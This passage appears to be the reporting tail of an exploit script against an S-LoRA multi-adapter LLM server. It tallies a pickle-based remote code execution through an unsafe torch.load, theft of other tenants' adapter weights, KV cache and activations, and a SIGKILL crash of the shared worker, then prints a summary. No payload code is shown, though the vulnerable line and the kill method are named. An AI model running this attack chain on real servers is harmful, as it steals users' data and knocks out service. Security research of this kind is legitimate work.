        "pid_match": pid_match,
        "vulnerable_code": "hf_load_utils.py:34 — torch.load without weights_only=True",
    },
    "data_theft": {
        "wrs_auth": {
            "recovery":                      wrs_recovery,
            "idx_map_found":                 wrs.get("idx_map_found", False),
            "victim_paths_found":            wrs.get("victim_paths_found", []),
            "victim_cells_count":            wrs.get("victim_cells_count", 0),
            "atk_cells_count":               wrs.get("atk_cells_count", 0),
            "cells_disjoint":                wrs.get("cells_disjoint", False),
            "victim_vs_attacker_cosine_sim": wrs.get("victim_vs_attacker_cosine_sim"),
            "victim_weight_cosine_sim_direct": wrs.get("victim_weight_cosine_sim_direct"),
            "victim_weight_plane":           wrs.get("victim_weight_plane"),
            "victim_weight_elements_compared": wrs.get("victim_weight_elements_compared"),
            "victim_data_sample":            wrs.get("victim_data_sample"),
            "atk_data_sample":               wrs.get("atk_data_sample"),
        },
        "kcrr_live": {
            "recovery":            kl_recovery,
            "baseline_cells":      kl.get("baseline_cells", 0),
            "peak_kv_cells":       kl.get("peak_kv_cells", 0),
            "kv_nonzero_fraction": kl.get("kv_nonzero_fraction", 0.0),
            "sample_kv":           kl.get("sample_kv"),
            "scans":               kl.get("scans", 0),
        },
        "aa_activations": {
            "recovery":            aa_recovery,
            "method":              aa.get("method", ""),
            "modules_hooked":      aa.get("modules_hooked", []),
            "C_before":            aa.get("C_before", 0),
            "C_victim":            aa.get("C_victim", 0),
            "N_victim_expected":   aa.get("N_victim_tokens_expected", 0),
            "per_token_rate":      aa.get("per_token_rate", 0.0),
            "activations_captured": aa.get("activations_captured", 0),
            "gc_total_scanned":    aa.get("gc_total_scanned", 0),
            "duck_module_hooks":   aa.get("duck_module_hooks", 0),
            "sample_activation":   aa.get("sample_activation"),
            "note": (
                "Primary capture path: torch.mm — S-LoRA's LLaMA uses torch.mm for "
                "ALL linear projections (QKV/O/gate/up/down + LM head in 32 layers). "
                "C_before=0 (no inference at hook install time T=10s). "
                "C_victim = captures from victim requests only. "
                "per_token_rate = C_victim / N_victim_tokens_expected."
            ),
        },
    },
    "fault_injection": {
        "method": "os.kill(pid, SIGKILL) from within pickle __reduce__ payload",
        "injected": fault_injected,
        "victims_in_flight": n_victims,
        "victims_killed": failed,
        "victims_survived": succeeded,
        "blast_radius": blast_radius,
        "server_recovered": recovery,
        "description": (
            "Attacker SIGKILL terminates S-LoRA shared model worker — "
            "all concurrent victim requests fail instantly. No auto-recovery."
        ),
    },
    "all_metrics_confirmed": all_confirmed,
    "verdict": (
        "FULL BLIND STEAL-THEN-CRASH CONFIRMED — zero-knowledge HTTP attacker "
        f"stole adapter weights ({wrs.get('victim_cells_count',0)} victim cells, cos_sim={wrs.get('victim_vs_attacker_cosine_sim')}), "
        f"KV cache ({kl.get('peak_kv_cells',0)} peak KV cells), "
        f"and activations ({aa.get('activations_captured',0)} forward-pass captures, C_victim={aa.get('C_victim',0)}), "
        f"then crashed the shared model worker killing {failed}/{n_victims} concurrent victim requests. "
        f"Server did not recover."
        if all_confirmed else
        "PARTIAL — check individual fields."
    ),
}

json.dump(result, open(out, "w"), indent=2)
print("\n=== SUMMARY ===")
print(f"  Threat model   : ZERO knowledge, HTTP only, 2x .bin upload")
print(f"  Phase 1 recon  : {recon.get('total_tensor_classes',0)} class(es) with large CUDA tensors (blind scan)")
print(f"  RCE (pickle)   : {'CONFIRMED pid='+str(payload_pid) if chain_a_executed else 'NOT FIRED'}")
print(f"  WRS-auth       : recovery={wrs_recovery:.2f}  victim_cells={wrs.get('victim_cells_count',0)}  disjoint={wrs.get('cells_disjoint')}  weight_direct_cos={wrs.get('victim_weight_cosine_sim_direct')} (plane={wrs.get('victim_weight_plane')}, n={wrs.get('victim_weight_elements_compared')})")
print(f"  KCRR live      : recovery={kl_recovery:.2f}  baseline={kl.get('baseline_cells',0)}  peak_kv={kl.get('peak_kv_cells',0)}  nonzero_frac={kl.get('kv_nonzero_fraction',0):.3f}")
print(f"  AA activations : recovery={aa_recovery:.2f}  C_before={aa.get('C_before',0)}  C_victim={aa.get('C_victim',0)}  rate={aa.get('per_token_rate',0):.1f}/tok")
print(f"  Fault injected : {fault_injected}")
print(f"  Blast radius   : {blast_radius:.2f}  ({failed}/{n_victims} victims killed)")
print(f"  Recovery       : {'YES' if recovery else 'NO'}")
print(f"  Verdict: {'CONFIRMED' if all_confirmed else 'PARTIAL'}")
PY

echo ""
echo "[attack] result written -> $OUT"
